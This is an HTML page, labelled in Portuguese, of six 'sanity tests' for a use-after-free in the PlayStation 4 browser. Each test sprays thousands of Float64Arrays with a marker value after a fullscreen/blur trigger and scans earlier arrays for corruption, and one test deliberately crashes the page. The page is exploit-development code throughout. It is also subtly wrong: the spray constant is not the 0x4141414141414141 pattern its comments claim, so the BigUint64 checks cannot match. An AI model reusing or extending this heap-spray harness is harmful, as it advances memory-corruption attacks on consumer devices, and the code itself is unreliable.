<!DOCTYPE html>
<html>
<body>

<h1>PS4 UAF - TESTES DE SANIDADE</h1>

<hr>

<h2>TESTE 1: Float64 detecta corrupção?</h2>
<button onclick="test1()">RODAR TESTE 1</button>
<pre id="t1"></pre>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.textContent = 'Criando 2000 Float64Arrays...\n';
    
    let arrays = [];
    for(let i = 0; i < 2000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    r.textContent += 'Arrays criados. Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        const P = 2.121995791e-314; // 0x4141414141414141
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(P);
            spray.push(s);
        }
        
        if(count === 2) {
            r.textContent += '\nVerificando corrupção...\n';
            
            let found = false;
            for(let i = 0; i < arrays.length; i++) {
                if(arrays[i][0] === P) {
                    r.textContent += 'CORRUPTED: arrays[' + i + ']\n';
                    r.textContent += 'Valor: ' + arrays[i][0] + '\n';
                    found = true;
                    break;
                }
            }
            
            if(!found) {
                r.textContent += 'NENHUMA CORRUPÇÃO DETECTADA\n';
            }
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TESTE 2: BigUint64 detecta corrupção?</h2>
<button onclick="test2()">RODAR TESTE 2</button>
<pre id="t2"></pre>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.textContent = 'Criando 2000 BigUint64Arrays...\n';
    
    let arrays = [];
    for(let i = 0; i < 2000; i++) {
        let a = new BigUint64Array(8);
        a[0] = BigInt(i);
        arrays.push(a);
    }
    
    r.textContent += 'Arrays criados. Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(2.121995791e-314); // 0x4141414141414141
            spray.push(s);
        }
        
        if(count === 2) {
            r.textContent += '\nVerificando corrupção...\n';
            
            const P = 0x4141414141414141n;
            
            let found = false;
            for(let i = 0; i < arrays.length; i++) {
                if(arrays[i][0] === P) {
                    r.textContent += 'CORRUPTED: arrays[' + i + ']\n';
                    r.textContent += 'Valor: 0x' + arrays[i][0].toString(16) + '\n';
                    found = true;
                    break;
                }
            }
            
            if(!found) {
                r.textContent += 'NENHUMA CORRUPÇÃO DETECTADA\n';
            }
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TESTE 3: Float64 + BigUint64 juntos?</h2>
<button onclick="test3()">RODAR TESTE 3</button>
<pre id="t3"></pre>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.textContent = 'Criando 1000 Float64 + 1000 BigUint64...\n';
    
    let float64 = [];
    let biguint64 = [];
    
    for(let i = 0; i < 1000; i++) {
        let f = new Float64Array(8);
        f[0] = i;
        float64.push(f);
        
        let b = new BigUint64Array(8);
        b[0] = BigInt(i + 5000);
        biguint64.push(b);
    }
    
    r.textContent += 'Arrays criados. Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        const P = 2.121995791e-314;
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(P);
            spray.push(s);
        }
        
        if(count === 2) {
            r.textContent += '\nVerificando Float64...\n';
            
            let f_found = false;
            for(let i = 0; i < float64.length; i++) {
                if(float64[i][0] === P) {
                    r.textContent += 'Float64[' + i + '] CORROMPIDO\n';
                    f_found = true;
                    break;
                }
            }
            
            if(!f_found) r.textContent += 'Float64: nenhuma corrupção\n';
            
            r.textContent += '\nVerificando BigUint64...\n';
            
            const P_BIG = 0x4141414141414141n;
            let b_found = false;
            for(let i = 0; i < biguint64.length; i++) {
                if(biguint64[i][0] === P_BIG) {
                    r.textContent += 'BigUint64[' + i + '] CORROMPIDO\n';
                    b_found = true;
                    break;
                }
            }
            
            if(!b_found) r.textContent += 'BigUint64: nenhuma corrupção\n';
            
            r.textContent += '\n--- RESULTADO ---\n';
            r.textContent += 'Float64: ' + (f_found ? 'SIM' : 'NÃO') + '\n';
            r.textContent += 'BigUint64: ' + (b_found ? 'SIM' : 'NÃO') + '\n';
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TESTE 4: Apenas crash (baseline)</h2>
<button onclick="test4()">RODAR TESTE 4 (VAI CRASHAR)</button>
<pre id="t4"></pre>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.textContent = 'ATENÇÃO: Vai crashar o navegador!\n';
    r.textContent += 'Criando arrays...\n';
    
    let arrays = [];
    for(let i = 0; i < 2000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    r.textContent += 'Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(2.121995791e-314);
            spray.push(s);
        }
        
        if(count === 2) {
            r.textContent += 'Crashando em 2 segundos...\n';
            
            setTimeout(function() {
                document.open();
                document.write('<html><body>CRASH</body></html>');
                document.close();
                setTimeout(() => location.reload(), 500);
            }, 2000);
        }
    };
}
</script>

<hr>

<h2>TESTE 5: Varredura completa (todos offsets)</h2>
<button onclick="test5()">RODAR TESTE 5</button>
<pre id="t5"></pre>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.textContent = 'Criando 1000 Float64Arrays...\n';
    
    let arrays = [];
    for(let i = 0; i < 1000; i++) {
        let a = new Float64Array(8);
        for(let j = 0; j < 8; j++) {
            a[j] = i + (j * 0.1);
        }
        arrays.push(a);
    }
    
    r.textContent += 'Arrays criados. Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        const P = 2.121995791e-314;
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(P);
            spray.push(s);
        }
        
        if(count === 2) {
            r.textContent += '\nVarrendo 1000 arrays x 8 offsets...\n';
            
            let corrupted = [];
            
            for(let i = 0; i < arrays.length; i++) {
                for(let j = 0; j < 8; j++) {
                    if(arrays[i][j] === P) {
                        corrupted.push({arr: i, off: j});
                    }
                }
            }
            
            if(corrupted.length > 0) {
                r.textContent += 'ENCONTRADAS ' + corrupted.length + ' CORRUPÇÕES:\n';
                
                for(let i = 0; i < Math.min(10, corrupted.length); i++) {
                    r.textContent += '  arrays[' + corrupted[i].arr + '][' + corrupted[i].off + ']\n';
                }
                
                if(corrupted.length > 10) {
                    r.textContent += '  ... e mais ' + (corrupted.length - 10) + '\n';
                }
            } else {
                r.textContent += 'NENHUMA CORRUPÇÃO EM NENHUM OFFSET\n';
            }
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TESTE 6: Verificação imediata (durante spray)</h2>
<button onclick="test6()">RODAR TESTE 6</button>
<pre id="t6"></pre>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.textContent = 'Criando arrays...\n';
    
    let arrays = [];
    for(let i = 0; i < 2000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    r.textContent += 'Aperte OPTIONS.\n';
    
    document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        r.textContent += 'Blur ' + count + '\n';
        
        const P = 2.121995791e-314;
        
        let spray = [];
        let found_during = false;
        
        // Spray em batches, verificando entre cada
        for(let batch = 0; batch < 80; batch++) {
            // Cria 100 arrays
            for(let i = 0; i < 100; i++) {
                let s = new Float64Array(8);
                s.fill(P);
                spray.push(s);
            }
            
            // Verifica IMEDIATAMENTE
            for(let i = 0; i < arrays.length; i++) {
                if(arrays[i][0] === P) {
                    r.textContent += 'DETECTADO no batch ' + batch + ', arrays[' + i + ']\n';
                    found_during = true;
                    batch = 999; // para o loop
                    break;
                }
            }
        }
        
        if(count === 2) {
            if(!found_during) {
                r.textContent += 'NÃO detectado durante spray\n';
            }
            
            window.onblur = null;
        }
    };
}
</script>

</body>
</html>
